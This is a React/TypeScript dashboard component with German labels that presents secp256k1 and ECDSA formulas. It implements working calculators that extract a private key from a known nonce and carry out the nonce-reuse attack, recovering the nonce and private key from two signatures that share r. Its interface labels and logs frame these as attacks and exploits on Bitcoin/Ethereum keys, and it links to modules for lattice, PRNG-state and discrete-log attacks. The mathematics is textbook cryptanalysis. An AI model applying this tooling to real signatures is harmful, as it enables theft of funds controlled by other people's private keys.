import { useState, useMemo, useCallback } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Label } from "@/components/ui/label";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Progress } from "@/components/ui/progress";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { 
  Calculator, BookOpen, Link2, Play, RotateCcw, 
  Atom, Binary, Hash, Key, Lock, Unlock,
  ChevronRight, Sigma, Pi, Infinity, Zap,
  AlertTriangle, CheckCircle, XCircle, Info
} from "lucide-react";
import { SECP256K1, modInverse, toFullHex, safeBigInt } from "@/lib/crypto-math";

// ═══════════════════════════════════════════════════════════════════════════════
// UNIFIED RESEARCH DASHBOARD
// ═══════════════════════════════════════════════════════════════════════════════
// 
// INTEGRIERTES MATHEMATISCHES MASTER-DOKUMENT
// Strukturinversion, Elliptische Kurven, Dynamische Systeme
// 
// WISSENSCHAFTLICHE STUDIE - EDUCATIONAL PURPOSE ONLY
// ═══════════════════════════════════════════════════════════════════════════════

interface FormulaSection {
  id: string;
  title: string;
  category: 'algebraic' | 'ecdsa' | 'inversion' | 'dynamics' | 'entropy';
  formulas: Formula[];
  linkedModules: string[];
}

interface Formula {
  id: string;
  name: string;
  latex: string;
  description: string;
  variables: { symbol: string; meaning: string }[];
  isInteractive?: boolean;
}

interface CalculationResult {
  success: boolean;
  result: string;
  steps: string[];
  intermediates: { name: string; value: string }[];
}

// Master Formula Database
const FORMULA_SECTIONS: FormulaSection[] = [
  {
    id: 'algebraic',
    title: 'I. Algebraischer Grundraum',
    category: 'algebraic',
    linkedModules: ['EllipticCurveVisualizer', 'BSGSVisualizer'],
    formulas: [
      {
        id: 'finite_field',
        name: 'Endlicher Körper 𝔽ₚ',
        latex: 'p = 2²⁵⁶ - 2³² - 977',
        description: 'Der Körper definiert die geometrische Existenzebene der Kurve',
        variables: [
          { symbol: 'p', meaning: 'Prime Modulus (secp256k1)' },
          { symbol: '𝔽ₚ', meaning: 'Menge {0, 1, ..., p-1}' }
        ]
      },
      {
        id: 'curve_order',
        name: 'Gruppenordnung N',
        latex: 'N = 0xFFFFFFFFF...BAAEDCE6AF48A03BBFD25E8CD0364141',
        description: 'Ordnung der zyklischen Gruppe ⟨G⟩',
        variables: [
          { symbol: 'N', meaning: 'Anzahl Punkte auf der Kurve' },
          { symbol: 'ℤₙ', meaning: 'Skalar-Ring für Schlüssel' }
        ]
      },
      {
        id: 'modular_inverse',
        name: 'Modulare Inverse (Fermat)',
        latex: 'a⁻¹ ≡ a^(N-2) mod N',
        description: 'Inverse via kleiner Fermatscher Satz (da N prim)',
        variables: [
          { symbol: 'a⁻¹', meaning: 'Multiplikative Inverse von a' },
          { symbol: 'N-2', meaning: 'Exponent für Fermat-Inversion' }
        ],
        isInteractive: true
      }
    ]
  },
  {
    id: 'ecdsa',
    title: 'II. Elliptische Kurven & ECDSA',
    category: 'ecdsa',
    linkedModules: ['ECDSACalculator', 'PollardsRhoVisualizer', 'HNPLatticeAttack'],
    formulas: [
      {
        id: 'secp256k1',
        name: 'secp256k1 Kurvengleichung',
        latex: 'E: y² ≡ x³ + 7 (mod p)',
        description: 'Weierstraß-Form der Bitcoin/Ethereum Kurve',
        variables: [
          { symbol: 'E', meaning: 'Elliptische Kurve' },
          { symbol: 'a=0, b=7', meaning: 'Kurvenparameter' }
        ]
      },
      {
        id: 'public_key',
        name: 'Public Key Ableitung',
        latex: 'Q = d · G = G + G + ... + G (d-mal)',
        description: 'Diskreter Logarithmus: Q aus d zu berechnen ist einfach, d aus Q ist schwer',
        variables: [
          { symbol: 'd', meaning: 'Private Key ∈ [1, N-1]' },
          { symbol: 'G', meaning: 'Generator Point' },
          { symbol: 'Q', meaning: 'Public Key (Punkt auf E)' }
        ]
      },
      {
        id: 'ecdsa_sign',
        name: 'ECDSA Signatur',
        latex: 's = k⁻¹(z + r·d) mod N',
        description: 'Die Signatur (r, s) bindet Message-Hash z an Private Key d',
        variables: [
          { symbol: 'k', meaning: 'Ephemeral Nonce (GEHEIM!)' },
          { symbol: 'r', meaning: 'x-Koordinate von k·G mod N' },
          { symbol: 's', meaning: 'Signatur-Skalar' },
          { symbol: 'z', meaning: 'Message Hash (truncated)' }
        ],
        isInteractive: true
      },
      {
        id: 'ecdsa_verify',
        name: 'ECDSA Verifikation',
        latex: 'R = u₁·G + u₂·Q, wobei u₁=z·s⁻¹, u₂=r·s⁻¹',
        description: 'Gültig wenn x-Koordinate von R ≡ r (mod N)',
        variables: [
          { symbol: 'u₁, u₂', meaning: 'Verifikations-Skalare' },
          { symbol: 'R', meaning: 'Rekonstruierter Punkt' }
        ]
      }
    ]
  },
  {
    id: 'inversion',
    title: 'III. Strukturinversion (MASTER FORMULA)',
    category: 'inversion',
    linkedModules: ['WeakKeyDatabase', 'MersenneTwisterAnalyzer', 'TimingAttackSimulator'],
    formulas: [
      {
        id: 'master_inversion',
        name: '⚡ MASTER INVERSIONSFORMEL',
        latex: 'd ≡ (s·k - z) · r⁻¹ mod N',
        description: 'DIE ZENTRALE FORMEL: Aus bekannter Nonce k folgt sofort der Private Key d',
        variables: [
          { symbol: 'd', meaning: 'PRIVATE KEY (Ziel!)' },
          { symbol: 'k', meaning: 'Nonce (wenn bekannt → Game Over)' },
          { symbol: 's, r, z', meaning: 'Öffentliche Signaturwerte' }
        ],
        isInteractive: true
      },
      {
        id: 'nonce_reuse',
        name: 'Nonce Reuse Attack',
        latex: 'd = (z₁ - z₂) · (s₁ - s₂)⁻¹ · r⁻¹ mod N',
        description: 'Bei k₁ = k₂ (gleiche Nonce) → Sofortige Key Recovery',
        variables: [
          { symbol: 'z₁, z₂', meaning: 'Zwei verschiedene Message-Hashes' },
          { symbol: 's₁, s₂', meaning: 'Zugehörige Signaturen' }
        ],
        isInteractive: true
      },
      {
        id: 'affine_mapping',
        name: 'Affine Kandidaten-Abbildung',
        latex: 'Ψₛ: k ↦ d = (s·k - z)·r⁻¹ mod N',
        description: 'Lineare Transformation: Jeder Nonce-Kandidat ergibt eindeutigen Key-Kandidaten',
        variables: [
          { symbol: 'Ψₛ', meaning: 'Affine Abbildung (bijektiv!)' },
          { symbol: 'Δd', meaning: 's·δ·r⁻¹ (konstante Schrittweite)' }
        ]
      }
    ]
  },
  {
    id: 'dynamics',
    title: 'IV. Dynamische Systeme',
    category: 'dynamics',
    linkedModules: ['DynamicSystemVisualizer', 'BackwardOperator', 'ChronoplastVisualizer'],
    formulas: [
      {
        id: 'backward_operator',
        name: 'Rückwärts-Operator',
        latex: 'ℛ(X) := F⁻¹(X) = {y ∈ 𝒮 | F(y) ∈ X}',
        description: 'Mengeninversion für nicht-invertierbare Abbildungen',
        variables: [
          { symbol: 'ℛ', meaning: 'Rückwärts-Operator (Preimage)' },
          { symbol: 'F', meaning: 'Vorwärts-Dynamik' },
          { symbol: '𝒮', meaning: 'Zustandsraum' }
        ]
      },
      {
        id: 'attractor',
        name: 'Attraktor & Einzugsgebiet',
        latex: 'ℬ(𝒜) := {x ∈ 𝒮 | lim_{t→∞} F^t(x) ∈ 𝒜}',
        description: 'Menge aller Punkte die zum Attraktor konvergieren',
        variables: [
          { symbol: '𝒜', meaning: 'Attraktor (invariante Menge)' },
          { symbol: 'ℬ(𝒜)', meaning: 'Basin of Attraction' }
        ]
      },
      {
        id: 'invariant',
        name: 'Strukturelle Invariante',
        latex: 'Φ(F(x)) = Φ(x) ∀x ∈ 𝒮',
        description: 'Erhaltungsgröße unter Systemevolution',
        variables: [
          { symbol: 'Φ', meaning: 'Invarianten-Funktion' },
          { symbol: 'x ~ y', meaning: 'Äquivalenzklasse: Φ(x)=Φ(y)' }
        ]
      },
      {
        id: 'lyapunov',
        name: 'Lyapunov Exponent',
        latex: 'λ = lim_{n→∞} (1/n) Σ log|F\'(xᵢ)|',
        description: 'Maß für Chaos: λ > 0 bedeutet exponentielles Auseinanderlaufen',
        variables: [
          { symbol: 'λ', meaning: 'Lyapunov Exponent' },
          { symbol: 'F\'', meaning: 'Ableitung der Dynamik' }
        ]
      }
    ]
  },
  {
    id: 'entropy',
    title: 'V. Entropie & Informationstheorie',
    category: 'entropy',
    linkedModules: ['EntropyComparator', 'QuantumEntropyVisualizer', 'MersenneTwisterAnalyzer'],
    formulas: [
      {
        id: 'shannon',
        name: 'Shannon-Entropie',
        latex: 'H(X) = -Σ p(x) log₂ p(x)',
        description: 'Maß der Unsicherheit/Information in bits',
        variables: [
          { symbol: 'H(X)', meaning: 'Entropie der Zufallsvariable X' },
          { symbol: 'p(x)', meaning: 'Wahrscheinlichkeit von x' }
        ]
      },
      {
        id: 'key_entropy',
        name: 'Schlüsselraum-Entropie',
        latex: 'H(K) = log₂|K| = log₂(N) ≈ 256 bits',
        description: 'Vollständiger secp256k1 Schlüsselraum',
        variables: [
          { symbol: 'K', meaning: 'Kandidaten-Menge' },
          { symbol: '|K|', meaning: 'Größe des Suchraums' }
        ]
      },
      {
        id: 'entropy_update',
        name: 'Entropie-Reduktion',
        latex: 'ℋ_{t+1} = ℋ_t - ε, wobei ε ∈ ℝ⁺',
        description: 'Jeder getestete Kandidat reduziert die Entropie',
        variables: [
          { symbol: 'ℋ_t', meaning: 'Entropie zum Zeitpunkt t' },
          { symbol: 'ε', meaning: 'Information pro Test' }
        ]
      },
      {
        id: 'sync_param',
        name: 'Synchronisationsparameter',
        latex: 'P_sync = Nodes_active / Nodes_target ∈ [0,1]',
        description: 'Fortschritt bei verteilter Suche',
        variables: [
          { symbol: 'P_sync', meaning: 'Synchronisationsgrad' },
          { symbol: 'Nodes', meaning: 'Parallele Suchinstanzen' }
        ]
      }
    ]
  }
];

// Module Links for cross-referencing
const MODULE_LINKS: Record<string, { name: string; description: string; route: string }> = {
  'ECDSACalculator': { name: 'ECDSA Calculator', description: 'Signatur-Erstellung und Verifikation', route: 'ecdsa' },
  'PollardsRhoVisualizer': { name: "Pollard's Rho", description: 'ECDLP Solver mit Zykluserkennung', route: 'pollard' },
  'BSGSVisualizer': { name: 'Baby-Giant Steps', description: 'Space-Time Tradeoff ECDLP', route: 'bsgs' },
  'HNPLatticeAttack': { name: 'HNP Lattice', description: 'Hidden Number Problem via LLL', route: 'hnp' },
  'MersenneTwisterAnalyzer': { name: 'MT19937 Analyzer', description: 'PRNG State Recovery', route: 'mersenne' },
  'TimingAttackSimulator': { name: 'Timing Attack', description: 'Side-Channel Simulation', route: 'timing' },
  'WeakKeyDatabase': { name: 'Weak Keys DB', description: 'Bekannte Schwachstellen', route: 'weakkeys' },
  'EntropyComparator': { name: 'Entropy Analysis', description: 'RNG Qualitätsprüfung', route: 'entropy' },
  'DynamicSystemVisualizer': { name: 'Dynamic Systems', description: 'Iterierte Abbildungen', route: 'dynamics' },
  'BackwardOperator': { name: 'Backward Operator', description: 'Mengeninversion', route: 'backward' },
  'ChronoplastVisualizer': { name: 'Chronoplast', description: 'Zeitliche Rückwärtsanalyse', route: 'chrono' },
  'QuantumEntropyVisualizer': { name: 'Quantum Entropy', description: 'Quantenbasierte Zufälligkeit', route: 'quantum' },
  'EllipticCurveVisualizer': { name: 'EC Visualizer', description: 'Elliptische Kurven Geometrie', route: 'curve' }
};

interface UnifiedResearchDashboardProps {
  onModuleNavigate?: (module: string) => void;
  onLogMessage?: (msg: string) => void;
}

const UnifiedResearchDashboard = ({ onModuleNavigate, onLogMessage }: UnifiedResearchDashboardProps) => {
  const [activeSection, setActiveSection] = useState('inversion');
  const [calculatorInputs, setCalculatorInputs] = useState({
    s: '',
    r: '',
    z: '',
    k: '',
    d: '',
    // For nonce reuse
    s1: '', s2: '', z1: '', z2: '', r_shared: ''
  });
  const [calculationResult, setCalculationResult] = useState<CalculationResult | null>(null);
  const [selectedFormula, setSelectedFormula] = useState<Formula | null>(null);
  const [logs, setLogs] = useState<string[]>([
    '[RESEARCH] Unified Research Dashboard initialisiert',
    '[RESEARCH] Master-Formeln geladen: ' + FORMULA_SECTIONS.reduce((acc, s) => acc + s.formulas.length, 0),
    '[RESEARCH] Bereit für interaktive Berechnungen...'
  ]);

  const addLog = useCallback((msg: string) => {
    const timestamp = new Date().toLocaleTimeString();
    setLogs(prev => [...prev.slice(-100), `[${timestamp}] ${msg}`]);
    onLogMessage?.(msg);
  }, [onLogMessage]);

  // Master Inversion Calculator
  const calculateMasterInversion = useCallback(() => {
    const { s, r, z, k } = calculatorInputs;
    
    if (!s || !r || !z || !k) {
      addLog('[ERROR] Alle Felder (s, r, z, k) müssen ausgefüllt sein');
      return;
    }

    try {
      const N = SECP256K1.N;
      const sBig = safeBigInt(s);
      const rBig = safeBigInt(r);
      const zBig = safeBigInt(z);
      const kBig = safeBigInt(k);

      if (!sBig || !rBig || !zBig || !kBig) {
        throw new Error('Ungültige Hex-Werte');
      }

      addLog('[CALC] Starte Master-Inversionsberechnung...');
      
      const steps: string[] = [];
      const intermediates: { name: string; value: string }[] = [];

      // Step 1: r^-1 mod N
      steps.push('Schritt 1: Berechne r⁻¹ mod N (Fermat: r^(N-2) mod N)');
      const rInv = modInverse(rBig, N);
      intermediates.push({ name: 'r⁻¹', value: '0x' + toFullHex(rInv) });
      
      // Step 2: s * k mod N
      steps.push('Schritt 2: Berechne s·k mod N');
      const sk = (sBig * kBig) % N;
      intermediates.push({ name: 's·k', value: '0x' + toFullHex(sk) });
      
      // Step 3: (s*k - z) mod N
      steps.push('Schritt 3: Berechne (s·k - z) mod N');
      const diff = ((sk - zBig) % N + N) % N;
      intermediates.push({ name: 's·k - z', value: '0x' + toFullHex(diff) });
      
      // Step 4: d = (s*k - z) * r^-1 mod N
      steps.push('Schritt 4: Berechne d = (s·k - z)·r⁻¹ mod N');
      const d = (diff * rInv) % N;
      intermediates.push({ name: 'd (Private Key)', value: '0x' + toFullHex(d) });
      
      // Verification
      steps.push('Verifikation: s ≡ k⁻¹(z + r·d) mod N');
      const kInv = modInverse(kBig, N);
      const sCheck = (kInv * ((zBig + rBig * d) % N)) % N;
      const verified = sCheck === sBig;
      intermediates.push({ name: 'Verifikation', value: verified ? '✓ KORREKT' : '✗ FEHLER' });

      setCalculationResult({
        success: verified,
        result: '0x' + toFullHex(d),
        steps,
        intermediates
      });

      addLog(`[RESULT] Private Key d = 0x${toFullHex(d).substring(0, 16)}...`);
      addLog(`[VERIFY] Signatur-Check: ${verified ? 'BESTÄTIGT ✓' : 'FEHLGESCHLAGEN ✗'}`);

    } catch (error) {
      addLog(`[ERROR] Berechnung fehlgeschlagen: ${error}`);
      setCalculationResult({
        success: false,
        result: 'Fehler bei der Berechnung',
        steps: [],
        intermediates: []
      });
    }
  }, [calculatorInputs, addLog]);

  // Nonce Reuse Attack Calculator
  const calculateNonceReuse = useCallback(() => {
    const { s1, s2, z1, z2, r_shared } = calculatorInputs;
    
    if (!s1 || !s2 || !z1 || !z2 || !r_shared) {
      addLog('[ERROR] Alle Felder für Nonce-Reuse müssen ausgefüllt sein');
      return;
    }

    try {
      const N = SECP256K1.N;
      const s1Big = safeBigInt(s1);
      const s2Big = safeBigInt(s2);
      const z1Big = safeBigInt(z1);
      const z2Big = safeBigInt(z2);
      const rBig = safeBigInt(r_shared);

      if (!s1Big || !s2Big || !z1Big || !z2Big || !rBig) {
        throw new Error('Ungültige Hex-Werte');
      }

      addLog('[ATTACK] Starte Nonce-Reuse Angriff...');
      
      const steps: string[] = [];
      const intermediates: { name: string; value: string }[] = [];

      // Step 1: (z1 - z2) mod N
      steps.push('Schritt 1: Berechne (z₁ - z₂) mod N');
      const zDiff = ((z1Big - z2Big) % N + N) % N;
      intermediates.push({ name: 'z₁ - z₂', value: '0x' + toFullHex(zDiff) });

      // Step 2: (s1 - s2) mod N
      steps.push('Schritt 2: Berechne (s₁ - s₂) mod N');
      const sDiff = ((s1Big - s2Big) % N + N) % N;
      intermediates.push({ name: 's₁ - s₂', value: '0x' + toFullHex(sDiff) });

      // Step 3: k = (z1 - z2) / (s1 - s2) mod N
      steps.push('Schritt 3: Berechne k = (z₁ - z₂)·(s₁ - s₂)⁻¹ mod N');
      const sDiffInv = modInverse(sDiff, N);
      const k = (zDiff * sDiffInv) % N;
      intermediates.push({ name: 'k (Nonce)', value: '0x' + toFullHex(k) });

      // Step 4: d = (s1*k - z1) / r mod N
      steps.push('Schritt 4: Berechne d = (s₁·k - z₁)·r⁻¹ mod N');
      const rInv = modInverse(rBig, N);
      const sk1 = (s1Big * k) % N;
      const diff = ((sk1 - z1Big) % N + N) % N;
      const d = (diff * rInv) % N;
      intermediates.push({ name: 'd (Private Key)', value: '0x' + toFullHex(d) });

      // Verification
      steps.push('Verifikation beider Signaturen...');
      const kInv = modInverse(k, N);
      const s1Check = (kInv * ((z1Big + rBig * d) % N)) % N;
      const s2Check = (kInv * ((z2Big + rBig * d) % N)) % N;
      const verified = s1Check === s1Big && s2Check === s2Big;
      intermediates.push({ name: 'Beide Signaturen', value: verified ? '✓ VERIFIZIERT' : '✗ FEHLER' });

      setCalculationResult({
        success: verified,
        result: '0x' + toFullHex(d),
        steps,
        intermediates
      });

      addLog(`[EXPLOIT] Nonce k = 0x${toFullHex(k).substring(0, 16)}...`);
      addLog(`[EXPLOIT] Private Key d = 0x${toFullHex(d).substring(0, 16)}...`);
      addLog(`[EXPLOIT] Angriff ${verified ? 'ERFOLGREICH ✓' : 'FEHLGESCHLAGEN ✗'}`);

    } catch (error) {
      addLog(`[ERROR] Nonce-Reuse Angriff fehlgeschlagen: ${error}`);
      setCalculationResult({
        success: false,
        result: 'Fehler beim Angriff',
        steps: [],
        intermediates: []
      });
    }
  }, [calculatorInputs, addLog]);

  const currentSection = useMemo(() => 
    FORMULA_SECTIONS.find(s => s.id === activeSection),
    [activeSection]
  );

  const getCategoryColor = (category: string) => {
    switch (category) {
      case 'algebraic': return 'text-cyan-400 border-cyan-500/30 bg-cyan-950/30';
      case 'ecdsa': return 'text-emerald-400 border-emerald-500/30 bg-emerald-950/30';
      case 'inversion': return 'text-red-400 border-red-500/30 bg-red-950/30';
      case 'dynamics': return 'text-purple-400 border-purple-500/30 bg-purple-950/30';
      case 'entropy': return 'text-amber-400 border-amber-500/30 bg-amber-950/30';
      default: return 'text-zinc-400 border-zinc-500/30 bg-zinc-950/30';
    }
  };

  const getCategoryIcon = (category: string) => {
    switch (category) {
      case 'algebraic': return <Atom className="w-4 h-4" />;
      case 'ecdsa': return <Key className="w-4 h-4" />;
      case 'inversion': return <Unlock className="w-4 h-4" />;
      case 'dynamics': return <Infinity className="w-4 h-4" />;
      case 'entropy': return <Binary className="w-4 h-4" />;
      default: return <Hash className="w-4 h-4" />;
    }
  };

  return (
    <div className="space-y-4 h-full">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="p-2 bg-gradient-to-br from-red-500/20 to-orange-500/20 rounded-lg border border-red-500/30">
            <BookOpen className="w-6 h-6 text-red-400" />
          </div>
          <div>
            <h2 className="text-lg font-bold text-red-400 font-mono">
              UNIFIED RESEARCH DASHBOARD
            </h2>
            <p className="text-xs text-zinc-500 font-mono">
              Integriertes Mathematisches Master-Dokument
            </p>
          </div>
        </div>
        <Badge variant="outline" className="border-amber-500/50 text-amber-400 font-mono text-xs">
          <AlertTriangle className="w-3 h-3 mr-1" />
          WISSENSCHAFTLICHE STUDIE
        </Badge>
      </div>

      {/* Section Tabs */}
      <div className="flex gap-2 flex-wrap">
        {FORMULA_SECTIONS.map(section => (
          <Button
            key={section.id}
            variant={activeSection === section.id ? "default" : "outline"}
            size="sm"
            onClick={() => setActiveSection(section.id)}
            className={`font-mono text-xs ${
              activeSection === section.id 
                ? 'bg-zinc-800 border-zinc-600' 
                : 'bg-zinc-900/50 border-zinc-700/50 hover:bg-zinc-800/50'
            }`}
          >
            {getCategoryIcon(section.category)}
            <span className="ml-1.5">{section.title.split('.')[0]}</span>
          </Button>
        ))}
      </div>

      <div className="grid grid-cols-1 xl:grid-cols-3 gap-4">
        {/* Left: Formula List */}
        <Card className="bg-zinc-900/80 border-zinc-700/50 xl:col-span-1">
          <CardHeader className="pb-2">
            <CardTitle className={`text-sm font-mono flex items-center gap-2 ${getCategoryColor(currentSection?.category || '')}`}>
              {getCategoryIcon(currentSection?.category || '')}
              {currentSection?.title}
            </CardTitle>
          </CardHeader>
          <CardContent>
            <ScrollArea className="h-[400px] pr-3">
              <div className="space-y-2">
                {currentSection?.formulas.map(formula => (
                  <div
                    key={formula.id}
                    onClick={() => setSelectedFormula(formula)}
                    className={`p-3 rounded-lg border cursor-pointer transition-all ${
                      selectedFormula?.id === formula.id
                        ? 'bg-zinc-800 border-zinc-600'
                        : 'bg-zinc-900/50 border-zinc-800 hover:border-zinc-700'
                    }`}
                  >
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-xs font-bold text-zinc-300 font-mono">
                        {formula.name}
                      </span>
                      {formula.isInteractive && (
                        <Badge variant="outline" className="text-[10px] border-green-500/50 text-green-400">
                          <Calculator className="w-2.5 h-2.5 mr-0.5" />
                          INTERAKTIV
                        </Badge>
                      )}
                    </div>
                    <code className="text-emerald-400 text-xs font-mono block bg-black/30 p-2 rounded">
                      {formula.latex}
                    </code>
                  </div>
                ))}
              </div>
            </ScrollArea>

            {/* Linked Modules */}
            <div className="mt-4 pt-3 border-t border-zinc-800">
              <p className="text-[10px] text-zinc-500 font-mono mb-2 flex items-center gap-1">
                <Link2 className="w-3 h-3" />
                VERKNÜPFTE MODULE
              </p>
              <div className="flex flex-wrap gap-1">
                {currentSection?.linkedModules.map(mod => (
                  <Button
                    key={mod}
                    variant="ghost"
                    size="sm"
                    onClick={() => onModuleNavigate?.(MODULE_LINKS[mod]?.route || mod)}
                    className="h-6 px-2 text-[10px] font-mono bg-zinc-800/50 hover:bg-zinc-700/50 text-zinc-400 hover:text-zinc-200"
                  >
                    <ChevronRight className="w-2.5 h-2.5 mr-0.5" />
                    {MODULE_LINKS[mod]?.name || mod}
                  </Button>
                ))}
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Center: Interactive Calculator */}
        <Card className="bg-zinc-900/80 border-zinc-700/50 xl:col-span-2">
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-mono text-zinc-300 flex items-center gap-2">
              <Calculator className="w-4 h-4 text-emerald-400" />
              INTERAKTIVER MASTER-FORMEL RECHNER
            </CardTitle>
          </CardHeader>
          <CardContent>
            <Tabs defaultValue="inversion" className="w-full">
              <TabsList className="w-full bg-zinc-800/50 mb-4">
                <TabsTrigger value="inversion" className="flex-1 text-xs font-mono">
                  <Key className="w-3 h-3 mr-1" />
                  Master Inversion
                </TabsTrigger>
                <TabsTrigger value="nonce_reuse" className="flex-1 text-xs font-mono">
                  <Zap className="w-3 h-3 mr-1" />
                  Nonce Reuse Attack
                </TabsTrigger>
              </TabsList>

              <TabsContent value="inversion" className="space-y-4">
                <div className="p-3 bg-black/30 rounded-lg border border-zinc-800">
                  <code className="text-lg text-red-400 font-mono font-bold">
                    d ≡ (s·k - z) · r⁻¹ mod N
                  </code>
                  <p className="text-xs text-zinc-500 mt-1 font-mono">
                    Wenn Nonce k bekannt → Private Key d sofort berechenbar
                  </p>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <Label className="text-xs text-zinc-400 font-mono">s (Signatur-Skalar)</Label>
                    <Input
                      value={calculatorInputs.s}
                      onChange={(e) => setCalculatorInputs(prev => ({ ...prev, s: e.target.value }))}
                      placeholder="0x..."
                      className="font-mono text-xs bg-black/30 border-zinc-700"
                    />
                  </div>
                  <div>
                    <Label className="text-xs text-zinc-400 font-mono">r (x-Koordinate von R)</Label>
                    <Input
                      value={calculatorInputs.r}
                      onChange={(e) => setCalculatorInputs(prev => ({ ...prev, r: e.target.value }))}
                      placeholder="0x..."
                      className="font-mono text-xs bg-black/30 border-zinc-700"
                    />
                  </div>
                  <div>
                    <Label className="text-xs text-zinc-400 font-mono">z (Message Hash)</Label>
                    <Input
                      value={calculatorInputs.z}
                      onChange={(e) => setCalculatorInputs(prev => ({ ...prev, z: e.target.value }))}
                      placeholder="0x..."
                      className="font-mono text-xs bg-black/30 border-zinc-700"
                    />
                  </div>
                  <div>
                    <Label className="text-xs text-zinc-400 font-mono">
                      <span className="text-red-400">k (NONCE - GEHEIM!)</span>
                    </Label>
                    <Input
                      value={calculatorInputs.k}
                      onChange={(e) => setCalculatorInputs(prev => ({ ...prev, k: e.target.value }))}
                      placeholder="0x..."
                      className="font-mono text-xs bg-black/30 border-red-900/50"
                    />
                  </div>
                </div>

                <Button
                  onClick={calculateMasterInversion}
                  className="w-full bg-gradient-to-r from-red-600 to-orange-600 hover:from-red-500 hover:to-orange-500 font-mono"
                >
                  <Play className="w-4 h-4 mr-2" />
                  BERECHNE PRIVATE KEY
                </Button>
              </TabsContent>

              <TabsContent value="nonce_reuse" className="space-y-4">
                <div className="p-3 bg-black/30 rounded-lg border border-zinc-800">
                  <code className="text-lg text-red-400 font-mono font-bold">
                    d = (z₁ - z₂) · (s₁ - s₂)⁻¹ · r⁻¹ mod N
                  </code>
                  <p className="text-xs text-zinc-500 mt-1 font-mono">
                    Zwei Signaturen mit identischer Nonce (k₁ = k₂) → Sofortige Key-Extraktion
                  </p>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <Label className="text-xs text-zinc-400 font-mono">r (gemeinsam, da k₁=k₂)</Label>
                    <Input
                      value={calculatorInputs.r_shared}
                      onChange={(e) => setCalculatorInputs(prev => ({ ...prev, r_shared: e.target.value }))}
                      placeholder="0x..."
                      className="font-mono text-xs bg-black/30 border-zinc-700"
                    />
                  </div>
                  <div className="col-span-2 grid grid-cols-2 gap-3">
                    <div className="space-y-2">
                      <p className="text-xs text-cyan-400 font-mono">Signatur 1:</p>
                      <Input
                        value={calculatorInputs.s1}
                        onChange={(e) => setCalculatorInputs(prev => ({ ...prev, s1: e.target.value }))}
                        placeholder="s₁ = 0x..."
                        className="font-mono text-xs bg-black/30 border-zinc-700"
                      />
                      <Input
                        value={calculatorInputs.z1}
                        onChange={(e) => setCalculatorInputs(prev => ({ ...prev, z1: e.target.value }))}
                        placeholder="z₁ = 0x..."
                        className="font-mono text-xs bg-black/30 border-zinc-700"
                      />
                    </div>
                    <div className="space-y-2">
                      <p className="text-xs text-amber-400 font-mono">Signatur 2:</p>
                      <Input
                        value={calculatorInputs.s2}
                        onChange={(e) => setCalculatorInputs(prev => ({ ...prev, s2: e.target.value }))}
                        placeholder="s₂ = 0x..."
                        className="font-mono text-xs bg-black/30 border-zinc-700"
                      />
                      <Input
                        value={calculatorInputs.z2}
                        onChange={(e) => setCalculatorInputs(prev => ({ ...prev, z2: e.target.value }))}
                        placeholder="z₂ = 0x..."
                        className="font-mono text-xs bg-black/30 border-zinc-700"
                      />
                    </div>
                  </div>
                </div>

                <Button
                  onClick={calculateNonceReuse}
                  className="w-full bg-gradient-to-r from-amber-600 to-red-600 hover:from-amber-500 hover:to-red-500 font-mono"
                >
                  <Zap className="w-4 h-4 mr-2" />
                  NONCE REUSE ATTACK AUSFÜHREN
                </Button>
              </TabsContent>
            </Tabs>

            {/* Calculation Result */}
            {calculationResult && (
              <div className={`mt-4 p-4 rounded-lg border ${
                calculationResult.success 
                  ? 'bg-green-950/30 border-green-500/30' 
                  : 'bg-red-950/30 border-red-500/30'
              }`}>
                <div className="flex items-center gap-2 mb-3">
                  {calculationResult.success ? (
                    <CheckCircle className="w-5 h-5 text-green-400" />
                  ) : (
                    <XCircle className="w-5 h-5 text-red-400" />
                  )}
                  <span className={`font-mono text-sm font-bold ${
                    calculationResult.success ? 'text-green-400' : 'text-red-400'
                  }`}>
                    {calculationResult.success ? 'PRIVATE KEY EXTRAHIERT' : 'BERECHNUNG FEHLGESCHLAGEN'}
                  </span>
                </div>

                {calculationResult.success && (
                  <div className="mb-3">
                    <Label className="text-xs text-zinc-500 font-mono">Private Key d:</Label>
                    <code className="block p-2 bg-black/50 rounded text-emerald-400 font-mono text-xs break-all">
                      {calculationResult.result}
                    </code>
                  </div>
                )}

                <div className="space-y-2">
                  <p className="text-xs text-zinc-500 font-mono">Berechnungsschritte:</p>
                  {calculationResult.steps.map((step, i) => (
                    <div key={i} className="text-xs text-zinc-400 font-mono flex items-start gap-2">
                      <span className="text-zinc-600">{i + 1}.</span>
                      <span>{step}</span>
                    </div>
                  ))}
                </div>

                <div className="mt-3 pt-3 border-t border-zinc-700/50 space-y-1">
                  <p className="text-xs text-zinc-500 font-mono">Zwischenwerte:</p>
                  {calculationResult.intermediates.map((inter, i) => (
                    <div key={i} className="flex justify-between text-xs font-mono">
                      <span className="text-zinc-500">{inter.name}:</span>
                      <span className="text-cyan-400 max-w-[300px] truncate">{inter.value}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </CardContent>
        </Card>
      </div>

      {/* Console Log */}
      <Card className="bg-zinc-900/80 border-zinc-700/50">
        <CardHeader className="py-2 px-3">
          <CardTitle className="text-xs font-mono text-zinc-400 flex items-center gap-2">
            <Hash className="w-3 h-3" />
            RESEARCH CONSOLE
          </CardTitle>
        </CardHeader>
        <CardContent className="py-0 px-3 pb-3">
          <ScrollArea className="h-24">
            <div className="space-y-0.5">
              {logs.map((log, i) => (
                <div key={i} className={`text-[10px] font-mono ${
                  log.includes('ERROR') ? 'text-red-400' :
                  log.includes('EXPLOIT') || log.includes('RESULT') ? 'text-emerald-400' :
                  log.includes('ATTACK') ? 'text-amber-400' :
                  'text-zinc-500'
                }`}>
                  {log}
                </div>
              ))}
            </div>
          </ScrollArea>
        </CardContent>
      </Card>
    </div>
  );
};

export default UnifiedResearchDashboard;
